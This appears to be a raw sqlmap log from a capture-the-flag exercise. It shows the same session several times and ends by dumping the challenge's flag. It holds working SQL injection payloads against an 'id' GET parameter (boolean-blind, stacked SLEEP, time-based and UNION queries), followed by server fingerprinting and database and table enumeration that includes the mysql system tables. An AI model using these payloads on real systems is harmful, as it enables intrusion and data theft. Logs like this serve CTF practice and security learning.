@@ -1,0 +1,250 @@
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6247=6247
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x754e655043466e474e44634f6e6d766a794a5671774f754b4450457274664459676e446c7a786a46,0x716a6b6a71),NULL,NULL,NULL-- ALdX
+---
+web server operating system: Linux CentOS
+web application technology: PHP 7.1.1, Apache 2.4.6
+back-end DBMS: MySQL > 5.0.11
+available databases [6]:
+[*] app
+[*] I_h4v3_4_fl4g_4nn
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] users
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6247=6247
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x754e655043466e474e44634f6e6d766a794a5671774f754b4450457274664459676e446c7a786a46,0x716a6b6a71),NULL,NULL,NULL-- ALdX
+---
+web server operating system: Linux CentOS
+web application technology: PHP 7.1.1, Apache 2.4.6
+back-end DBMS: MySQL > 5.0.11
+Database: users
+[1 table]
++----------------------------------------------+
+| user                                         |
++----------------------------------------------+
+
+Database: performance_schema
+[17 tables]
++----------------------------------------------+
+| cond_instances                               |
+| events_waits_current                         |
+| events_waits_history                         |
+| events_waits_history_long                    |
+| events_waits_summary_by_instance             |
+| events_waits_summary_by_thread_by_event_name |
+| events_waits_summary_global_by_event_name    |
+| file_instances                               |
+| file_summary_by_event_name                   |
+| file_summary_by_instance                     |
+| mutex_instances                              |
+| performance_timers                           |
+| rwlock_instances                             |
+| setup_consumers                              |
+| setup_instruments                            |
+| setup_timers                                 |
+| threads                                      |
++----------------------------------------------+
+
+Database: I_h4v3_4_fl4g_4nn
+[1 table]
++----------------------------------------------+
+| flags                                        |
++----------------------------------------------+
+
+Database: mysql
+[24 tables]
++----------------------------------------------+
+| user                                         |
+| columns_priv                                 |
+| db                                           |
+| event                                        |
+| func                                         |
+| general_log                                  |
+| help_category                                |
+| help_keyword                                 |
+| help_relation                                |
+| help_topic                                   |
+| host                                         |
+| ndb_binlog_index                             |
+| plugin                                       |
+| proc                                         |
+| procs_priv                                   |
+| proxies_priv                                 |
+| servers                                      |
+| slow_log                                     |
+| tables_priv                                  |
+| time_zone                                    |
+| time_zone_leap_second                        |
+| time_zone_name                               |
+| time_zone_transition                         |
+| time_zone_transition_type                    |
++----------------------------------------------+
+
+Database: app
+[1 table]
++----------------------------------------------+
+| books                                        |
++----------------------------------------------+
+
+Database: information_schema
+[62 tables]
++----------------------------------------------+
+| CHARACTER_SETS                               |
+| CLIENT_STATISTICS                            |
+| COLLATIONS                                   |
+| COLLATION_CHARACTER_SET_APPLICABILITY        |
+| COLUMNS                                      |
+| COLUMN_PRIVILEGES                            |
+| ENGINES                                      |
+| EVENTS                                       |
+| FILES                                        |
+| GLOBAL_STATUS                                |
+| GLOBAL_VARIABLES                             |
+| INDEX_STATISTICS                             |
+| INNODB_BUFFER_PAGE                           |
+| INNODB_BUFFER_PAGE_LRU                       |
+| INNODB_BUFFER_POOL_PAGES                     |
+| INNODB_BUFFER_POOL_PAGES_BLOB                |
+| INNODB_BUFFER_POOL_PAGES_INDEX               |
+| INNODB_BUFFER_POOL_STATS                     |
+| INNODB_CHANGED_PAGES                         |
+| INNODB_CMP                                   |
+| INNODB_CMPMEM                                |
+| INNODB_CMPMEM_RESET                          |
+| INNODB_CMP_RESET                             |
+| INNODB_INDEX_STATS                           |
+| INNODB_LOCKS                                 |
+| INNODB_LOCK_WAITS                            |
+| INNODB_RSEG                                  |
+| INNODB_SYS_COLUMNS                           |
+| INNODB_SYS_FIELDS                            |
+| INNODB_SYS_FOREIGN                           |
+| INNODB_SYS_FOREIGN_COLS                      |
+| INNODB_SYS_INDEXES                           |
+| INNODB_SYS_STATS                             |
+| INNODB_SYS_TABLES                            |
+| INNODB_SYS_TABLESTATS                        |
+| INNODB_TABLE_STATS                           |
+| INNODB_TRX                                   |
+| INNODB_UNDO_LOGS                             |
+| KEY_CACHES                                   |
+| KEY_COLUMN_USAGE                             |
+| PARAMETERS                                   |
+| PARTITIONS                                   |
+| PLUGINS                                      |
+| PROCESSLIST                                  |
+| PROFILING                                    |
+| REFERENTIAL_CONSTRAINTS                      |
+| ROUTINES                                     |
+| SCHEMATA                                     |
+| SCHEMA_PRIVILEGES                            |
+| SESSION_STATUS                               |
+| SESSION_VARIABLES                            |
+| STATISTICS                                   |
+| TABLES                                       |
+| TABLESPACES                                  |
+| TABLE_CONSTRAINTS                            |
+| TABLE_PRIVILEGES                             |
+| TABLE_STATISTICS                             |
+| TRIGGERS                                     |
+| USER_PRIVILEGES                              |
+| USER_STATISTICS                              |
+| VIEWS                                        |
+| XTRADB_ADMIN_COMMAND                         |
++----------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6247=6247
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x754e655043466e474e44634f6e6d766a794a5671774f754b4450457274664459676e446c7a786a46,0x716a6b6a71),NULL,NULL,NULL-- ALdX
+---
+web server operating system: Linux CentOS
+web application technology: PHP 7.1.1, Apache 2.4.6
+back-end DBMS: MySQL > 5.0.11
+Database: I_h4v3_4_fl4g_4nn
+Table: flags
+[1 column]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| flag_is | varchar(200) |
++---------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6247=6247
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x754e655043466e474e44634f6e6d766a794a5671774f754b4450457274664459676e446c7a786a46,0x716a6b6a71),NULL,NULL,NULL-- ALdX
+---
+web server operating system: Linux CentOS
+web application technology: PHP 7.1.1, Apache 2.4.6
+back-end DBMS: MySQL > 5.0.11
+Database: I_h4v3_4_fl4g_4nn
+Table: flags
+[1 entry]
++------------------------------------+
+| flag_is                            |
++------------------------------------+
+| NoCTF{uni0n_sQ1_injecti0n_4nn\r\n} |
++------------------------------------+
+
